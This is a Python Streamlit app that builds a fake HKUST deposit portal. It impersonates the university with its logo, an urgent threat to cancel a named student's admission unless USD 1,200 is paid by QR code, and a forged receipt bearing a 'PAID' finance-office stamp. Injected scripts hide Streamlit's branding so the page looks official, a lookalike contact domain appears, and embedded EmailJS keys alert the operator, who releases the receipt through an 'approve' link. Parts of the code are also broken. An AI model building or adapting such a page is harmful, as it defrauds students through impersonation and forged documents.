import streamlit as st
import base64
import os
import time
from datetime import datetime
import requests

# --- 1. 頁面配置與極致淨化 ---
st.set_page_config(page_title="HKUST Deposit Portal", page_icon="✅", layout="wide")

def get_base64_file(file):
    if os.path.exists(file):
        with open(file, 'rb') as f: return base64.b64encode(f.read()).decode()
    return None

logo_base64 = get_base64_file("hkust.png")
STAMP_DATE = datetime.now().strftime('%d %B %Y').upper()

# --- 2. 注入絕殺級 CSS 與 JS (徹底封殺 Streamlit 標誌與管理按鈕) ---
st.markdown(f"""
<script>
    // 每 0.5 秒檢查並徹底刪除 Streamlit 注入的所有管理元素
    const killElements = () => {{
        const selectors = [
            'header', 'footer', '.stAppDeployButton', '.stDeployButton', 
            '[data-testid="stStatusWidget"]', '[data-testid="stHeader"]', 
            '[data-testid="stToolbar"]', '[data-testid="stDecoration"]',
            'iframe[title="Manage app"]', '#MainMenu'
        ];
        selectors.forEach(s => {{
            const el = document.querySelector(s);
            if (el) el.remove();
        }});
    }};
    setInterval(killElements, 500);
</script>

<style>
    /* CSS 輔助隱藏 */
    #MainMenu, header, footer, .stDeployButton, .stAppDeployButton {{display: none !important; visibility: hidden !important;}}
    [data-testid="stHeader"], [data-testid="stStatusWidget"], [data-testid="stDecoration"] {{display: none !important;}}
    
    /* 物理遮蓋牆：在螢幕底部建立白色屏蔽區 */
    .bottom-mask {{
        position: fixed; bottom: 0; left: 0; width: 100%; height: 50px;
        background-color: white !important; z-index: 9999999;
    }}

    /* 導航欄樣式 (提升層級以蓋掉殘影) */
    .nav-bar {{
        background-color: #003366; padding: 12px 60px; display: flex; align-items: center; color: white;
        border-bottom: 4px solid #A6937C; margin: -50px -100px 30px -100px;
        position: relative; z-index: 99999999 !important;
    }}
    .nav-logo {{ height: 85px; width: auto; mix-blend-mode: screen; margin-right: 25px; }}
    .system-title {{ border-left: 2px solid #fff; padding-left: 20px; font-size: 20px; font-weight: 500; line-height: 1.2; }}

    /* 卡片與收據樣式 */
    .payment-card {{ background: white; padding: 35px; border-radius: 12px; border: 1px solid #eee; color: #000 !important; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }}
    .deadline-box {{ color: #d32f2f !important; font-weight: bold; font-size: 16px; background-color: #f8d7da !important; padding: 18px; border-radius: 6px; margin: 15px 0; border: 1px solid #f5c6cb; line-height: 1.6; }}
    .info-box {{ background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; color: #856404; }}
    .receipt-box {{ background: white; border: 1px solid #003366; padding: 40px; max-width: 800px; margin: auto; position: relative; color: #333 !important; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }}
    .info-row {{ display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; }}

    /* 藍色圓形財務章 */
    .official-stamp {{
        position: absolute; bottom: 45px; right: 50px; width: 145px; height: 145px;
        border: 3px double #1a478a; border-radius: 50%; color: #1a478a;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        text-align: center; font-family: 'Courier New', monospace; font-weight: bold;
        transform: rotate(-10deg); opacity: 0.85; pointer-events: none;
    }}
    .stamp-paid {{ font-size: 24px; border-top: 2.5px solid #1a478a; border-bottom: 2.5px solid #1a478a; padding: 2px 6px; margin: 3px 0; }}
</style>
<div class="bottom-mask"></div>
""", unsafe_allow_html=True)

# --- 3. 狀態管理與 EmailJS 配置 ---
STATUS_FILE = "payment_status.txt"
def set_status(s):
    with open(STATUS_FILE, "w") as f: f.write(s)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

# 管理員審核跳轉連結處理
q = st.query_params
if q.get("action") in ["approve1"]:
    set_status(q.get("action").replace("approve", "approved"))
    st.success("Payment Verified Successfully!")
    st.stop()

# --- 重要：請填入您的 EmailJS 金鑰 ---
USER_ID = "2Mp8IGmfTvvDLueQN"
SERVICE_ID = "service_hjp7b95"
TEMPLATE_ID = "template_6sdyg2j"
MY_URL = "https://hkust-pre-of-tpg.streamlit.app/?embed=true"

PAYER = "XINGSHENG WANG"
USD_TOTAL ="1200"

if 'step' not in st.session_state: st.session_state.step = "pay1"

# --- 4. 渲染導航欄 ---
logo_html = f'<img src="data:image/png;base64,{logo_base64}" class="nav-logo">' if logo_base64 else ""
st.markdown(f'<div class="nav-bar">{logo_html}<div class="system-title">Deposit System<br><span style="font-size:12px; font-weight:normal;">Official Secure Gateway</span></div></div>', unsafe_allow_html=True)

# --- 5. 核心邏輯流程 ---

# Checking 動畫
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""<div style="text-align:center; margin-top:100px;"><div style="border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto;"></div><h2 style="color:#003366; margin-top:20px;">Verifying Transaction...</h2><p>Our Finance Office is verifying installment {stage} via Payoneer settlement system.</p></div>""", unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}": st.session_state.step = f"receipt{stage}"
    st.rerun()

# 支付階段 : 1200 USD
elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f"""<div class="payment-card">
<h3 style="color:#003366; margin-top:0;">Payment Plan Confirmation</h3>
<p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
<p>Deposit total: <b>USD {USD_TOTAL}</b> </p>
<div class="info-box"><b>Plan:</b> $1,200 </div>
<div class="deadline-box">
⚠️ URGENT NOTICE:<br>
Please complete the payment by 4:00 PM on May 4th. Failure to do so will result in the immediate cancellation of your admission offer and TLE MSc program seat.
</div>
<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Step: Installment - USD 1,200.00</p>
</div>""", unsafe_allow_html=True)
        st.image("qr1.png", width=400)
        if st.button("I HAVE PAID THE INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
            set_status("checking"); st.session_state.step = "checking"; st.rerun()

# 收據頁面 (分期收據)
elif st.session_state.step in ["receipt"]:
    sn = st.session_state.step[-1]
    amts = {"1": "1,200.00"}
    st.markdown(f"""
    <div class="receipt-box">
        <div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
            <h2 style="margin:0; color:#003366;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
            <p style="font-size:11px; margin-top:5px; color:#666;">Clear Water Bay, Kowloon, Hong Kong | Finance Office</p>
        </div>
        <h3 style="text-align:center; text-decoration: underline; color:#333;">OFFICIAL ELECTRONIC RECEIPT</h3>
        <div class="info-row"><span><b>Receipt No:</b></span><span>UST-{int(time.time())}</span></div>
        <div class="info-row"><span><b>Received From:</b></span><span>{PAYER}</span></div>
        <div class="info-row" style="border-top:2px solid #003366; margin-top:10px;"><span><b>AMOUNT RECEIVED:</b></span><span style="font-size:18px; color:#003366;"><b>USD {amts[sn]}</b></span></div>
        <div style="margin-top:40px; border-top: 1px dashed #eee; padding-top:15px;">
            <p style="font-size:12px; color:#666; margin-bottom:5px;"><b>Note:</b> No signature is required for this electronic document.</p>
            <p style="font-size:13px; color:#333;">For inquiries, contact: <a href="mailto:uagdmit@hkust-tle.hk" style="color:#003366; text-decoration:none;"><b>uagdmit@hkust-tle.hk</b></a></p>
        </div>
        <div class="official-stamp">
            <div style="font-size: 11px;">HKUST</div><div class="stamp-paid">PAID</div><div style="font-size: 13px;">{STAMP_DATE}</div><div style="font-size: 8px;">FINANCE OFFICE</div>
        </div>
    </div>
    """, unsafe_allow_html=True)
    st.write("## ")
    sn == "1":
  
    else:
        st.balloons(); st.success("All installments verified. Your admission is fully secured.")


# 頁腳
st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px; margin-bottom: 60px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
